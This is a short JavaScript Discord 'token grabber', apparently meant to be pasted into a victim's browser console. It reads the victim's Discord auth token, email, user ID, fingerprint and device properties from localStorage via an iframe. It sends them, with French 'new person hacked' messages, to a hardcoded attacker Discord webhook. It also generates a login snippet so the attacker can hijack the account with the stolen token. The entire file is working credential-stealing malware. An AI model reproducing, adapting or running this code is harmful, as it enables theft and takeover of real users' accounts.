this.document.location = "http://discord.com/"
location.reload();
var discordWebhook = "https://discord.com/api/webhooks/943210433509212161/4wHGNdqUJLTQSbEVoly7Fv21DuNQeB_SSUqicx70_n7p9LfOul-z7HQGl1wqasSfq7SA";
var i = document.createElement('iframe');
document.body.appendChild(i);
var request = new XMLHttpRequest();
request.open("POST", discordWebhook);
request.setRequestHeader('Content-type', 'application/json');
var params = {
    username: "Token Grabber",
    avatar_url: "https://malwarefox.com/wp-content/uploads/2017/11/hacker-1.png",
    content: '**Nouvelle personne hackée !**\n------------------\nToken : ' + i.contentWindow.localStorage.token + '\n------------------\nAdresse email : ' + i.contentWindow.localStorage.email_cache + '\n------------------\nUser ID : ' + i.contentWindow.localStorage.user_id_cache + '\n------------------\nFingerprint : ' + i.contentWindow.localStorage.fingerprint + '\n------------------\nPropriétés : \`\`\`json\n' + i.contentWindow.localStorage.deviceProperties + '\`\`\`------------------\nScript de login : \n\`\`\`js\nlocation.reload();var i = document.createElement(\'iframe\');document.body.appendChild(i);i.contentWindow.localStorage.token = "\\"' + i.contentWindow.localStorage.token.replace(/^"(.*)"$/, '$1') + '\\""\`\`\`'
};
request.send(JSON.stringify(params));
